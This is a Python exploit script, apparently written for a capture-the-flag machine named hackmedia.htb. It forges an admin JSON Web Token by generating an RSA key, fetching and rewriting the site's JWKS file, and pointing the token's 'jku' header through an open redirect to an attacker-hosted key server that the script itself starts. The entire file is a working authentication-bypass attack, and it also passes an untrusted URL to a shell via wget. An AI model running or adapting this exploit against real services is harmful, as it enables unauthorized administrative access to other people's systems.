#!/usr/bin/python3

import os
import sys
import subprocess
import requests
import pdb
import json
import jwt as jwt_header
from jwcrypto import jwk as jwk_crypt, jwt as jwt_crypt
import time
from termcolor import cprint
import signal

#ctrl+c
def handler(signum, frame):
    remove_files()
    printRed("\n[-] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

#JWK packages
def requirements():
    printRed("\n\n[!] Requirements!\n")
    printGreen("\t[+] pip install jwcrypto\n")
    printGreen("\t[+] pip install PyJWT\n")

#colors
printRed = lambda s: cprint(s, 'red', end=' ')
printYellow = lambda s: cprint(s, 'yellow', end=' ')
printMagenta = lambda s: cprint(s, 'magenta', end=' ')
printGreen = lambda s: cprint(s, 'green', end=' ')

#panel_help
def help():
    printYellow("\n[*] Uso : ")
    printMagenta(f"python3 {sys.argv[0]} <ip_address> <port> <cookie_session>")
    requirements()
    exit(1)  

#valid_input
if len(sys.argv) != 4: help()

#global variables
ip = sys.argv[1]
port = sys.argv[2]
user_token = sys.argv[3]

#create keys
def gen_key():
    subprocess.run(['openssl', 'genrsa', '-out', 'keypair.pem', '2048'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

#remove files 
def remove_files():
    subprocess.run(['rm', 'keypair.pem', 'jwks.json'])

#get header token
def get_headers():
    headers = jwt_header.get_unverified_header(user_token)
    return headers

#decode user_token
def download_json():
    headers = get_headers()
    jku = headers['jku']
    os.system(f"wget {jku} 2>/dev/null")

#create new json
def create_json(key):
    with open("jwks.json", "r") as jsonfile:
        data = json.load(jsonfile)
    data['keys'][0]['kid'] = key.kid
    data['keys'][0]['n'] = key.n
    data['keys'][0]['e'] = key.e

    with open("jwks.json", "w") as jsonfile:
            json.dump(data, jsonfile)

#get data token
def get_data_key():
    with open("keypair.pem", "rb") as pemfile:
        key = jwk_crypt.JWK.from_pem(pemfile.read())
    return key

#create token
def gen_token(key):
    headers = get_headers()
    token = jwt_crypt.JWT(
                header = {
                        "alg" : headers['alg'],
                        "jku" : f"http://hackmedia.htb/static/../redirect/?url={ip}:{port}/jwks.json"
                    },
                claims = {
                        "user" : "admin"
                    }
            )
    token.make_signed_token(key)
    return token.serialize()
     
#port sharing manually
def listen_port(port):
    printYellow(f"\n\n[+] Opening port {port} to share")
    printRed("jwks.json")
    printYellow("file...")
    printYellow(f"\n[+] Serving HTTP on 0.0.0.0 port {port}:\n")
    subprocess.run(['python3', '-m', 'http.server', str(port)])

if __name__ == '__main__':

    gen_key()
    download_json()
    key = get_data_key()
    create_json(key)
    admin_token = gen_token(key)
    printRed("\n[+] Admin token: ")
    printGreen(f"{admin_token}")
    listen_port(port)

